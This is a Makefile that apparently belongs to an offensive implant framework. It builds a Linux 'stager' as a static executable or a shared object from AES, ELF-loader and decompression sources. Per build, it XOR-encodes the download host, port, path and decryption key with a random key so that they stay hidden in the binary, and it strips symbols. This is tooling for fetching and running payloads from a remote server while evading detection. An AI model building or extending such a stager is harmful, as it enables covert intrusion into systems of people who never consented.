# Add tinf source files
TINF_SRC = adler32.c crc32.c tinfgzip.c tinflate.c tinfzlib.c

# Update the list of source files
SRC = stager.c aes.c elf_loader.c $(TINF_SRC)

# Listener type: HTTP, TCP, or UDP (default: HTTP)
LISTENER_TYPE ?= HTTP

# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(1, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Configure with XOR-encoded arrays
CFLAGS += -DGOARCH_$(ARCH) -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE) -DENCODED_HOST="$(XOR_HOST)" -DENCODED_PORT="$(XOR_PORT)" -DENCODED_PATH="$(XOR_PATH)" -DENCODED_KEY="$(XOR_KEY)" -DLISTENER_$(LISTENER_TYPE)

stager_so:
	${CC} ${CFLAGS} -DOS_LINUX -DLINUX_SO $(SRC) -o stager.so -fPIC -shared -ldl -nostdlib -nodefaultlibs -s
	@echo "Stager shared object compiled successfully at ${PWD}/stager.so"

stager_so_debug:
	${CC} ${CFLAGS} -DDEBUG -DOS_LINUX -DLINUX_SO $(SRC) -o stager.so -fPIC -shared -ldl -nostdlib -nodefaultlibs -g
	@echo "Stager shared object (with debug) compiled successfully at ${PWD}/stager.so"

stager_exe:
	musl-gcc ${CFLAGS} -DOS_LINUX -DLINUX_EXE $(SRC) -o stager -static -s
	@echo "Stager executable compiled successfully at ${PWD}/stager"

stager_exe_debug:
	musl-gcc ${CFLAGS} -DDEBUG -DOS_LINUX -DLINUX_EXE $(SRC) -o stager -static -g
	@echo "Stager executable (with debug) compiled successfully at ${PWD}/stager"
